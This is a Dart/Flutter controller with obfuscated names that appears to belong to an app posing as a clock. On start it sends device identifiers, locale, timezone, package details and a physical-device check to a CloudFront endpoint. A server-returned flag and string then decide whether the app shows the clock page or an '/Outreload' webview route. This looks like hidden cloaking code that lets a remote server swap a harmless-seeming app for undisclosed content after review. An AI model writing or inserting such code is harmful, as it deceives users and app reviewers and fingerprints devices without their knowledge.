import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class CutoutBurstTextLogic extends GetxController {

  var vfjzhy = RxBool(false);
  var weyoizdhrj = RxBool(true);
  var lqtvhiw = RxString("");
  var odzmavf = RxBool(false);
  var xcqimn = RxBool(true);
  final vdiuaerb = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    vrzuoawm();
  }


  Future<void> vrzuoawm() async {
    odzmavf.value = true;
    xcqimn.value = true;
    weyoizdhrj.value = false;

    vdiuaerb.post("https://d2l097vwfvt3ls.cloudfront.net/CDm1BA?no_check",data: await kexidczrn()).then((value) {
      var jhaxl = value.data["jhaxl"] as String;
      var nhcym = value.data["nhcym"] as bool;
      if (nhcym) {
        lqtvhiw.value = jhaxl;
        cnzmhx();
      } else {
        bsieo();
      }
    }).catchError((e) {
      weyoizdhrj.value = true;
      xcqimn.value = true;
      odzmavf.value = false;
    });
  }

  Future<Map<String, dynamic>> kexidczrn() async {
    final DeviceInfoPlugin qgwlhnc = DeviceInfoPlugin();
    PackageInfo cdmpbx_ramzw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var vngpom = Platform.localeName;
    var chVslPtO = currentTimeZone;

    var tWujSd = cdmpbx_ramzw.packageName;
    var oETwpH = cdmpbx_ramzw.version;
    var PSqLQG = cdmpbx_ramzw.buildNumber;

    var OGTSlnzF = cdmpbx_ramzw.appName;
    var tkzcoXL = "";
    var GirtbQ  = "";
    var ZgUE = "";
    var aicghy = "";
    var ikjshxrq = "";
    var rxckvt = "";
    var oahvjwu = "";
    var nrxvmik = "";
    var jialdh = "";
    var uzctwsb = "";
    var ngrcpvbx = "";


    var SFMY = "";
    var iZQj = false;

    if (GetPlatform.isAndroid) {
      SFMY = "android";
      var gjlbvkanp = await qgwlhnc.androidInfo;

      ZgUE = gjlbvkanp.brand;

      tkzcoXL  = gjlbvkanp.model;
      GirtbQ = gjlbvkanp.id;

      iZQj = gjlbvkanp.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      SFMY = "ios";
      var hqjgnxzb = await qgwlhnc.iosInfo;
      ZgUE = hqjgnxzb.name;
      tkzcoXL = hqjgnxzb.model;

      GirtbQ = hqjgnxzb.identifierForVendor ?? "";
      iZQj  = hqjgnxzb.isPhysicalDevice;
    }

    var res = {
      "OGTSlnzF": OGTSlnzF,
      "PSqLQG": PSqLQG,
      "oETwpH": oETwpH,
      "tWujSd": tWujSd,
      "tkzcoXL": tkzcoXL,
      "chVslPtO": chVslPtO,
      "ZgUE": ZgUE,
      "GirtbQ": GirtbQ,
      "vngpom": vngpom,
      "SFMY": SFMY,
      "iZQj": iZQj,
      "aicghy" : aicghy,
      "ikjshxrq" : ikjshxrq,
      "rxckvt" : rxckvt,
      "oahvjwu" : oahvjwu,
      "nrxvmik" : nrxvmik,
      "jialdh" : jialdh,
      "uzctwsb" : uzctwsb,
      "ngrcpvbx" : ngrcpvbx,

    };
    return res;
  }

  Future<void> bsieo() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> cnzmhx() async {
    Get.offNamed("/Outreload");
  }

}
